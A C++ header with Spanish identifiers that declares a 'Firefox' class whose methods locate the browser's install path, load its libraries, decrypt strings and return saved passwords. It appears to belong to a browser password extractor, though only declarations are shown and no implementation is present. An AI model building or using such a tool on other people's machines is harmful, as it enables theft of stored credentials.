#include <iostream>
#include <Shlwapi.h>
#include <shlobj.h>
#include <windows.h>


#include <string>

#include <vector>

#include <cstdio>


#include <fstream>
#include <tchar.h>
//#pragma comment(lib, "sqlite3.lib")
#include "sqlite3.h"
#include "Recursos.h"


using namespace std;


#pragma once
class Firefox
{
public:
	Firefox();
	~Firefox();

	char* rutaInstalado();
	BOOL loadFunctions(char* installPath);
	char* descifrar(const char* s);
	char* getContraseñas();
};

